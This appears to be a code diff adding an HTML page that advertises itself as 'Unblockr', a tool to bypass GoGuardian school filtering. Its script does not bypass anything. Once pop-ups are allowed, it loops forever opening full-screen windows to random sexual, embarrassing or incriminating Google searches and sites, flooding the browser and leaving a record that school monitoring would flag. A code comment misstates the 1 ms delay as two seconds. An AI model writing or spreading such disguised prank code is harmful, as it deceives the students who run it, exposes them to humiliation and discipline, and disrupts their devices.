@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Unblockr - Bypass GoGuardian</title>
+    <style>
+      body {
+        font-family: "Arial", sans-serif;
+        background: #f4f7fa;
+        color: #333;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        text-align: center;
+        background-color: #fff;
+        border-radius: 10px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 500px;
+        padding: 20px;
+      }
+
+      h1 {
+        color: #4caf50;
+        font-size: 24px;
+      }
+
+      h2 {
+        color: #666;
+        margin-top: 10px;
+        font-size: 16px;
+      }
+
+      #startRedirects {
+        background-color: #4caf50;
+        color: #fff;
+        padding: 15px 30px;
+        font-size: 18px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: all 0.3s;
+        margin-top: 30px;
+      }
+
+      #startRedirects:hover {
+        background-color: #45a049;
+      }
+
+      .instructions {
+        margin-top: 20px;
+        color: #666;
+        font-size: 14px;
+        line-height: 1.5;
+      }
+
+      #arrowContainer {
+        display: none;
+        margin-top: 30px;
+      }
+
+      #arrow {
+        font-size: 50px;
+        color: #f44336;
+        animation: blink 1s infinite alternate;
+      }
+
+      @keyframes blink {
+        0% {
+          opacity: 1;
+        }
+        100% {
+          opacity: 0;
+        }
+      }
+
+      #loadingText {
+        display: none;
+        margin-top: 20px;
+        font-size: 16px;
+        color: #2196f3;
+      }
+
+      .footer {
+        margin-top: 30px;
+        font-size: 12px;
+        color: #aaa;
+      }
+
+      .footer a {
+        color: #4caf50;
+        text-decoration: none;
+      }
+
+      .footer a:hover {
+        text-decoration: underline;
+      }
+
+      /* Styling for the banner */
+      .banner {
+        background-color: #2196f3;
+        color: white;
+        padding: 10px;
+        font-size: 18px;
+        border-radius: 5px;
+        position: absolute;
+        top: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 1000;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Unblockr: The Ultimate GoGuardian Bypass Tool</h1>
+      <h2>Unlock restricted sites with ease and speed.</h2>
+
+      <button id="startRedirects">Start Unblockr</button>
+
+      <div class="instructions">
+        <p>
+          To disable GoGuardian and access your favorite websites, follow the
+          steps below:
+        </p>
+        <ul>
+          <li>Click on the "Start Unblockr" button.</li>
+          <li>Enable pop-ups for this site when prompted.</li>
+          <li>Enjoy unrestricted access to the web!</li>
+        </ul>
+      </div>
+
+      <div id="arrowContainer">
+        <div id="arrow">&#8595;</div>
+        <p>Click here to enable pop-ups, then press the button again!</p>
+      </div>
+
+      <div id="loadingText">Redirecting... Please wait.</div>
+
+      <div class="footer">
+        <p>Need help? <a href="mailto:support@unblockr.com">Contact us</a>.</p>
+      </div>
+    </div>
+
+    <div class="banner" id="banner">
+      <strong>Warning:</strong> Please enable pop-ups for this site to continue.
+    </div>
+
+    <script>
+      const sites = [
+        "https://www.google.com/search?q=the+great+vulva+wall",
+        "https://www.google.com/search?q=how+to+make+friends",
+        "https://www.google.com/search?q=fortnite+free+download+no+virus",
+        "https://www.google.com/search?q=help+i+am+attracted+to+my+best+friend+(male)",
+        "https://www.google.com/search?q=how+to+use+my+reddit+mod+powers",
+        "https://www.google.com/search?q=rolbox+hacks",
+        "https://www.google.com/search?q=can+i+legally+marry+my+waifu",
+        "https://www.google.com/search?q=how+to+become+a+meme+lord+in+2025",
+        "https://www.google.com/search?q=ai+girlfriend+download",
+        "https://www.google.com/search?q=how+to+remove+stuff+from+my+school+search+history",
+        "https://www.google.com/search?q=why+does+discord+moderation+ruin+everything",
+        "https://www.google.com/search?q=top+10+ways+to+become+a+sigma+without+trying",
+        "https://www.google.com/search?q=maid+outfits+cheap",
+        "https://www.google.com/search?q=is+it+weird+to+be+attracted+to+sloth+(from+the+goonies)",
+        "https://www.google.com/search?q=what+is+jerkmate",
+        "https://www.google.com/search?q=jerkmate+techniques",
+        "https://www.google.com/search?q=jerkmate+hacked+client",
+        "https://www.google.com/search?q=how+to+become+an+alpha+male",
+        "https://www.google.com/search?q=pornhub",
+        "https://en.wikipedia.org/wiki/Diddy_parties",
+        "https://www.google.com/search?q=good+boy+behaviors",
+        "https://www.google.com/search?q=can+you+get+banned+for+being+too+good+at+jerkmate",
+        "https://www.google.com/search?q=why+does+my+search+history+make+me+look+like+a+criminal",
+        "https://www.google.com/search?q=does+wearing+a+cape+increase+charisma",
+        "https://www.google.com/search?q=what+is+the+darkest+timeline+and+am+I+in+it",
+        "https://www.google.com/search?q=how+to+break+up+with+someone+using+only+chess+metaphors",
+        "https://www.google.com/search?q=how+to+prove+to+friends+that+im+not+an+npc",
+        "https://www.google.com/search?q=best+ways+to+exploit+tax+loopholes",
+        "https://www.google.com/search?q=what+does+molest+mean",
+        "https://www.google.com/search?q=what+does+it+mean+to+'crack+a+femboy'",
+        "https://www.google.com/search?q=side+effects+of+constant+gooning",
+        "https://www.google.com/search?q=ts+pmo+sybau",
+        "https://www.google.com/search?q=who+killed+john+pork",
+        "https://pubmed.ncbi.nlm.nih.gov/39279235/",
+        "https://jerkmate.com/jerkmate-ranked",
+        "https://www.google.com/search?q=the+silk+road+dark+web",
+      ];
+
+      let blankWindows = [];
+
+      function openBlankPages() {
+        blankWindows.push(window.open("blocked.goguardian.com", "_blank"));
+        blankWindows.push(
+          window.open("blocked.goguardian.com/beacon/bypassAuth", "_blank")
+        );
+      }
+
+      function openSite() {
+        return new Promise((resolve) => {
+          window.open(
+            sites[Math.floor(Math.random() * sites.length)],
+            "_blank",
+            "toolbar=false,location=false,menubar=false,resizable=no,scrollbars=no,status=no,width=" +
+              screen.width +
+              ",height=" +
+              screen.height +
+              ",top=0,left=0"
+          );
+          resolve();
+        });
+      }
+
+      function delay(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+      }
+
+      function checkPopupPermission() {
+        return new Promise((resolve) => {
+          openBlankPages();
+          let testPopup = window.open("", "_blank");
+
+          if (
+            !testPopup ||
+            testPopup.closed ||
+            typeof testPopup.closed === "undefined"
+          ) {
+            resolve(false);
+          } else {
+            testPopup.close();
+            resolve(true);
+          }
+        });
+      }
+
+      document
+        .getElementById("startRedirects")
+        .addEventListener("click", async function () {
+          document.getElementById("banner").style.display = "block";
+
+          setTimeout(async function () {
+            document.getElementById("arrowContainer").style.display = "block";
+            document.getElementById("loadingText").style.display = "block";
+
+            const isPopupAllowed = await checkPopupPermission();
+
+            if (isPopupAllowed) {
+              alert("Pop-ups are enabled! Redirecting will begin.");
+              while (true) {
+                await openSite();
+                await delay(1); // Delay of 2 seconds between each open
+              }
+            } else {
+              alert(
+                "Pop-ups are blocked! Please enable pop-ups for this site and try again."
+              );
+            }
+
+            blankWindows.forEach((window) => window.close());
+          }, 1000);
+        });
+    </script>
+  </body>
+</html>
